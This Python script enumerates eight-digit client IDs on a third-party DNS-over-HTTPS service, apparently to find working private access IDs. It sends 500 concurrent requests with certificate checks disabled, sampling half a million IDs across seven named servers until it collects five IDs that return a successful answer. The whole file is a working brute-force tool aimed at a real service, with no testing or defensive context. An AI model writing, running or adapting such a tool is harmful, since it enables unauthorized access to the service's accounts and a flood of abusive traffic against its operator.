import asyncio
import aiohttp
import random
import time
import sys
import ssl

# Disable SSL warnings (we use verify=False equivalent)
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

DNS_QUERY_B64 = "q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB"

SERVERS = [
    "https://de.aeternia.space:8443",
    "https://nl.aeternia.space:8443",
    "https://fr.aeternia.space:8443",
    "https://in.aeternia.space:8443",
    "https://kz.aeternia.space:8443",
    "https://us.aeternia.space:8443",
    "https://tr.aeternia.space:8443"
]

async def check_id(session, client_id, server, progress):
    url = f"{server}/dns-query/{client_id}?dns={DNS_QUERY_B64}"
    headers = {"accept": "application/dns-message"}
    try:
        async with session.get(url, headers=headers, ssl=ssl_context, timeout=5) as resp:
            content = await resp.read()
            if resp.status == 200 and len(content) >= 4:
                rcode = content[3] & 0x0F
                if rcode == 0:  # NOERROR
                    return client_id, server
    except Exception:
        pass
    finally:
        progress["checked"] += 1
        if progress["checked"] % 500 == 0:
            print(f"Checked {progress['checked']} IDs... ({progress['checked'] / progress['total'] * 100:.2f}%)", end="\r")
    return None

async def worker(queue, session, progress, valid_ids, num_wanted):
    while len(valid_ids) < num_wanted:
        try:
            client_id, server = queue.get_nowait()
        except asyncio.QueueEmpty:
            break
        
        res = await check_id(session, client_id, server, progress)
        if res:
            found_id, found_server = res
            print(f"\n[+] FOUND VALID ID: {found_id} (Server: {found_server})")
            valid_ids.append(found_id)
            if len(valid_ids) >= num_wanted:
                break
        queue.task_done()

async def main():
    print("Starting fast asynchronous DNS ID checker...")
    
    start_id = 0
    end_id = 99999999
    
    sample_size = 500000
    print(f"Generating a random sample of {sample_size} IDs to check...")
    
    ids_to_check = random.sample(range(start_id, end_id + 1), sample_size)
    
    queue = asyncio.Queue()
    
    # Distribute requests across servers evenly
    server_idx = 0
    for cid in ids_to_check:
        formatted_id = f"{cid:08d}"
        queue.put_nowait((formatted_id, SERVERS[server_idx % len(SERVERS)]))
        server_idx += 1
        
    progress = {"checked": 0, "total": sample_size}
    valid_ids = []
    num_wanted = 5
    concurrency = 500 # 500 parallel requests
    
    connector = aiohttp.TCPConnector(limit=concurrency, ssl=ssl_context)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(concurrency):
            task = asyncio.create_task(worker(queue, session, progress, valid_ids, num_wanted))
            tasks.append(task)
            
        # Wait for all tasks to finish or we hit our target
        while len(valid_ids) < num_wanted and not queue.empty():
            await asyncio.sleep(1)
            
        # Cancel remaining tasks
        for task in tasks:
            task.cancel()

    print(f"\nFinished. Found {len(valid_ids)} valid IDs: {valid_ids}")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
